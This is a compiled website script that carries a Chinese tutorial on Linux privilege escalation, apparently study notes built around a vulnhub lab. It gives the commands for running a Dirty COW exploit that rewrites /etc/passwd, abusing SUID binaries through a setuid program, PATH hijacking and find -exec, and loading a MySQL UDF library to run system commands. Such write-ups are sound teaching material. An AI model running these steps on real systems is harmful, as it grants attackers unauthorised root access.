"use strict";(self.webpackChunkvuepress_theme_hope_template=self.webpackChunkvuepress_theme_hope_template||[]).push([[3009],{81021:(i,s)=>{s.A=(i,s)=>{const a=i.__vccOpts||i;for(const[i,e]of s)a[i]=e;return a}},45609:(i,s,a)=>{a.r(s),a.d(s,{comp:()=>S,data:()=>M});var e=a(6254);const l=a.p+"assets/img/image-20241029092110-p7prglr.b6b95f55.png",n=a.p+"assets/img/image-20241029195750-84a8l95.91260332.png",t=a.p+"assets/img/image-20241029201217-cx5rkke.f8001a59.png",h=a.p+"assets/img/image-20241029202049-3eegscn.797c3b12.png",A=a.p+"assets/img/image-20241029201512-epia8tj.d0ff9a11.png",p=a.p+"assets/img/image-20241029201902-siign71.70176cc5.png",g=a.p+"assets/img/image-20241029202359-inyrgfd.acfc1c2b.png",k=a.p+"assets/img/image-20241029202926-nli94xn.beced3c5.png",d=a.p+"assets/img/image-20241029203104-y4icdih.37ed82df.png",r=a.p+"assets/img/image-20241029203414-4d2f1y5.46565cbe.png",B=a.p+"assets/img/image-20241029203709-lcn13yw.c91f1194.png",c=a.p+"assets/img/image-20241029203958-dbt7iky.2fdd700e.png",o=a.p+"assets/img/image-20241029205138-kin0iq8.1652b369.png",m=a.p+"assets/img/image-20241029204907-ixb7y5g.a52e6a28.png",y=a.p+"assets/img/image-20241029205228-zo09yww.db092f46.png",u=a.p+"assets/img/image-20241029220236-0t5xtku.217592d4.png",b=a.p+"assets/img/image-20241029220510-nrtnjrb.770fd6e9.png",C=a.p+"assets/img/image-20241029220829-oo1ouml.e75ee248.png",I=a.p+"assets/img/image-20241029221204-dg4wamu.7758708a.png",Q=a.p+"assets/img/image-20241029221512-v29nr7n.c669ca23.png",E=a.p+"assets/img/image-20241030090236-flpdso1.34e393c5.png",v=a.p+"assets/img/image-20241030090411-emchsh5.97fb940c.png",F=a.p+"assets/img/image-20241030090631-o2fe5kv.bef24e0d.png",x=a.p+"assets/img/image-20241030091437-6sg2p6o.412f191a.png",f=a.p+"assets/img/image-20241030092023-qpt930x.0b005f6d.png",D=a.p+"assets/img/image-20241030093037-xwnclue.c91a12db.png",z=a.p+"assets/img/image-20241030093541-a2jd2iu.19ad476c.png",w=a.p+"assets/img/image-20241030095016-lg45oa3.35c2aedc.png",q=a.p+"assets/img/image-20241030100524-yxov0o6.41c2f379.png",L=a.p+"assets/img/image-20241030100500-uy7wp3h.3181621f.png",P=a.p+"assets/img/image-20241030100333-et46h57.aff01dd3.png",Z=a.p+"assets/img/image-20241030125927-5r4lin5.9f532626.png",W=a.p+"assets/img/image-20241030130032-38t82ka.2f67ae2e.png",V=a.p+"assets/img/image-20241030130435-wedwgfu.6d9d7d97.png",X=a.p+"assets/img/image-20241030130801-85tqc1x.27ad4b43.png",N=a.p+"assets/img/image-20241030130837-46xwz6f.d510c38b.png",U=a.p+"assets/img/image-20241030131246-ipztzcz.420ed192.png",O=a.p+"assets/img/image-20241030131641-2sfqff1.88154cf1.png",T=a.p+"assets/img/image-20241030132026-rdjy8fy.577ca37a.png",j={},S=(0,a(81021).A)(j,[["render",function(i,s){return(0,e.uX)(),(0,e.CE)("div",null,s[0]||(s[0]=[(0,e.Fv)('<p>Liux安装好系统后里面自带的软件或内核存在的漏洞，比较流行的有“脏牛提权”<br> Linux内核提权跟Windows一样，都要下载对应漏洞的脚本进行提权</p><h2 id="步骤" tabindex="-1"><a class="header-anchor" href="#步骤"><span>步骤</span></a></h2><h5 id="_1-基础信息收集" tabindex="-1"><a class="header-anchor" href="#_1-基础信息收集"><span>1.基础信息收集</span></a></h5><p>uname -a 打印所有可用的系统信息<br> uname -r 内核版本<br> uname -m 查看系统内核架构(64/32位)<br> cat /proc/version 内核信息<br> cat /etc/issue 发行版本信息<br> whoami 当前用户名<br> id 当前用户信息</p><p>​<img src="'+l+'" alt="image" loading="lazy">​</p><h5 id="_2-查找相关版本的内核漏洞" tabindex="-1"><a class="header-anchor" href="#_2-查找相关版本的内核漏洞"><span>2.查找相关版本的内核漏洞</span></a></h5><p>exp搜索链接：<a href="https://www.exploit-db.com/" title="https:lwww.exploit-db.com/" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/</a><br> exp下载链接：<a href="https://github.com/SecWiki/linux-kernel-exploits" title="https:l/github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener noreferrer">https://github.com/SecWiki/linux-kernel-exploits</a></p><h5 id="_3-使用exp利用漏洞提权" tabindex="-1"><a class="header-anchor" href="#_3-使用exp利用漏洞提权"><span>3.使用exp利用漏洞提权</span></a></h5><h2 id="提权方法" tabindex="-1"><a class="header-anchor" href="#提权方法"><span>提权方法</span></a></h2><h3 id="linux内核-系统提权" tabindex="-1"><a class="header-anchor" href="#linux内核-系统提权"><span>Linux内核/系统提权</span></a></h3><p>以脏牛提权-CVE-2016-5195为例 Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复</p><ol><li><p>查看目标主机用户权限</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">id</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>获取主机内核版本</p><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" data-title="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(apache:/var/www/html) $    cat /</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">proc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">version</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Linux </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">version</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">10</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">862</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">el7</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">x86_64</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (builder</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">@kbuilder</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">dev</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">centos</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.org) (gcc </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">version</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">5</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 20150623</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (Red Hat </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">4</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) (GCC) ) #</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> SMP Fri Apr </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">20</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 16</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">44</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">24</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> UTC </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2018</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(apache:/var/www/html) $    uname -a</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Linux </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">localhost</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">localdomain</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">10</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">862</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">el7</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">x86_64</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> #</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> SMP Fri Apr </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">20</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 16</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">44</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">24</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> UTC </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2018</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> x86_64 x86_64 x86_64 GNU/Linux</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>寻找对应exp</p></li><li><p>将exp下载到目标主机编译执行</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">gcc </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">pthread dirty.c </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">o dirty </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">lcrypt   </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#编译</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">dirty 新增用户的密码 </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#执行</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">dirty </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">123</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">cat </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">etc</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">passwd  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#查看是否新增用户</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">mv </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">tmp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">passwd.bak </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">etc</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">passwd     </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#销毁firefart密码文件即可恢复root</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ol><h3 id="linux-suid提权" tabindex="-1"><a class="header-anchor" href="#linux-suid提权"><span>Linux-suid提权</span></a></h3><p>当执行这个程序时会临时切换身份为文件所有者身份.</p><p>权限设定方法:</p><ol><li><p>字母表示法</p><p>chmod u+s FILE 添加SUID权限</p><p>chmod u-s FILE 删除SUID权限</p></li><li><p>数字表示法:</p><p>chmod 4755 FILE 添加SUID权限到二进制程序文件 **在普通三位数字权限之前，用4代表添加到SUID位</p><p>chmod 0xxx FILE 可以删除文件的SUID</p></li></ol><h4 id="suid提权步骤" tabindex="-1"><a class="header-anchor" href="#suid提权步骤"><span>suid提权步骤</span></a></h4><h5 id="suid-利用自定义文件提权步骤" tabindex="-1"><a class="header-anchor" href="#suid-利用自定义文件提权步骤"><span>suid 利用自定义文件提权步骤</span></a></h5><ol><li><p>编写简单demo.c 内容为以root权限，切换到ichungiu用户，实现第三方免密用指定账号登录系统</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#include&lt;unistd.h&gt; </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">void</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">{</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setuid(0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">); </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setgid(0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">); </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">system(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">&quot;su - ichunqiu&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>编译demo.c 文件，得到的demo</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">gcc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> demo.c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">  demo</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>给权限s，chmod u+s demo</p></li><li><p>伪装为su文件</p><p><span data-type="text" style="color:var(--b3-font-color8);">因为demo.c中有su这个系统命令，要让这个su命令执行的不是系统自带的su脚本</span></p></li><li><p>添加环境变量，让系统执行/tmp下的su文件</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">tmp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$PATH</span></span>\n<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $PATH</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>在普通账户下运行demo程序，成功切换到root账户，提权成功。</p></li></ol><h5 id="利用find-suid进行提权步骤" tabindex="-1"><a class="header-anchor" href="#利用find-suid进行提权步骤"><span>利用find_Suid进行提权步骤</span></a></h5><ol><li><p>找到find的脚本路径位置，并对其添加s权限</p></li><li><p>测试:切换为普通用户，并执行find语句，如:</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">find</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ichunqiu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> “whoami”</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> \\;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>注意:exec参数后面跟的是执行的系统命令 &quot;whoami&quot;</p><p>执行 whoami 的结果为root,说明find的s权限，让恶意用户越权成功</p></li></ol><h3 id="linux-mysql提权" tabindex="-1"><a class="header-anchor" href="#linux-mysql提权"><span>Linux mysql提权</span></a></h3><p>linux mysql UDF方式提权</p><h4 id="提权条件" tabindex="-1"><a class="header-anchor" href="#提权条件"><span>提权条件</span></a></h4><ul><li>mysql配置中，secure_file_priv=&quot;&quot;</li><li>具有<span data-type="text" style="color:var(--b3-font-color8);">root权限</span>，且mysql数据库以system权限运行</li><li>具有sq语句的执行权限</li><li>导出<span data-type="text" style="color:var(--b3-font-color8);">目录可写</span></li><li>系统中的selinux处于关闭状态</li></ul><h4 id="linux-mysql提权步骤" tabindex="-1"><a class="header-anchor" href="#linux-mysql提权步骤"><span>Linux mysql提权步骤</span></a></h4><ol><li><p>连接到目标主机获取到shell</p></li><li><p>尝试连接目标主机数据库</p></li><li><p>查看Mysql的plugin（插件库）目录路径</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">show</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> variables</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> like</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;%plugin%&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>找到对应数据库操作系统的UDF库文件</p></li><li><p>将UDF库文件转换为16进制格式</p></li><li><p>在数据库中写入UDF库到mysql插件目录</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">select</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> unhex(&#39;udf什六进制内容&#39;)into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> dumpfile </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;/usr/lib64/mysql/plugin/ichunqiu.so&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>声明创建函数</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> function</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> sys_eval</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> returns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> soname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;ichunqiu.so&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>执行提权函数</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">select</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> sys_eval(&#39;whoami&#39;);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>‍</p></li></ol><p>‍</p><h2 id="脏牛提权-cve-2016-5195" tabindex="-1"><a class="header-anchor" href="#脏牛提权-cve-2016-5195"><span>脏牛提权-CVE-2016-5195</span></a></h2><h3 id="搭建阶段" tabindex="-1"><a class="header-anchor" href="#搭建阶段"><span>搭建阶段</span></a></h3><ol><li><p>环境 vulhub <a href="https://www.vulnhub.com/entry/lampiao-1,249/" title="lampiao" target="_blank" rel="noopener noreferrer">lampiao</a> <span data-type="text" style="color:var(--b3-font-color8);">NAT模式</span></p><p>​<img src="'+n+'" alt="image" loading="lazy">​</p><p>报错解决法1：从vmware网站下载ovftool 4.1版本安装后，将安装目录下的文件，覆盖到VMware Workstation安装目录下的ovftools目录下即可。</p><p>报错解决法2：导入虚拟机的文件夹不能是vmdx原文件所在文件夹</p></li><li><p>不用登录</p><p>​<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABFIAAABaCAIAAAAUxOUjAAAJhklEQVR4Ae3aW24jOQwFUO9/KV7lACPMBYd6xGknaJd9+iOgKIpSHftD1cnt5h8BAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQIECBAgAABAgQI/JDA/d9/aZbhCO73e6aeDH6qVU44n+cw1YrPT/dIn3SoQdulDg9ldWrEY2HL1267OEt2Bc/n6wmf7zZ32H1Pdvm5w8j89jl3+8oTIECAAAECBAi8okC7HdZhjZ88+k+1Gn2WN+DDVDt8DpOgFjzYZ7m29pnj3ZLsmOB2u7XiNpybJ/N4ZZZ8K/jV/rvmu/zu5KN++T3ZLZEnQIAAAQIECBB4Z4F2oazDGj9J8COtRpNlq8NUO3lbvhy2ZOswho/UtIW7JeN2ntk2/O526dN2v8Rwd/hdfvlQo/hbS5Z9JAkQIECAAAECBN5HoN0O63B5fZwLhkXyWVXzSeY/4FM//2bjjFsX1i0e7NOW12HiBIeTPFLTlp+XzLNzpjVcDudVI9PySTa3lNWCbHRO5sMd9SlOz/SZg1acVud8+sxbzJkUCwgQIECAAAECBD5OoN0O6zBxgt0VeajtytqqL4vPn0HdpXVuU8s+qWm/VEm+9Vw2Sc1YVdfu6rNkV7Bskv67VXN+2WeU1al0rsGurO5Sm9R8e8BW1oZtYYa7sjnfMm3YDpP+AgIECBAgQIAAgQ8VaPfFOlzGy+Swe3Dqy+LzJ1F3ye12JPPz0CHLl6896ZCyQ6s69Uj9ueYwe5iqZxjxXDwy+dnKmkNIW1k2+m7/XZ80rMHcfLe8VbZhe4q6hZgAAQIECBAgQOATBdp9sQ6X8TI54B6c+rL4/DHUXVrlYSqVraYN57Nl4TlY9mlLzjXPzNaNWp86XMZPvvYse85vHbWsnrbFu7I53zJtOB+gbWRIgAABAgQIECDwWQLtvliHy3iZHGQPTn1ZfP4A6i6t8jCVylbThvPZsvAcLPu0Ja1mvG+kZp6tBW02q+agVdbhMvbaMxvKECBAgAABAgQIvJtAvQq3/yOvU4kTtOI2rGV1KvkEdfYR3Lqw1S+n5mQyCf6gT1vbhq3hGNaaGs+zs8lcv9zivLA2Sfyarz05XsNJPkErCEsrSF5AgAABAgQIECDwoQLjgpifUUim3SCTb5fsWlbj0bCumjNzfY6RIB0SZConmfvMmVpcO4w4zesvW7Kk1tfKVlzL5rZZmLJkap+arPmsmoO6JLNJ1qcYyVYzhqlvNVne8qlPwZd9su8c1G51ds4nk2C574N0dS8xAQIECBAgQIAAAQJvLjDeIq71kFc887WEnZYAAQIECBAgQIDAWwlc7hXicgd+q6+LhyFAgAABAgQIECBwOYHxCvH6LxL1nP6M7XJfMwcmQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIAAAQIECBAgQIA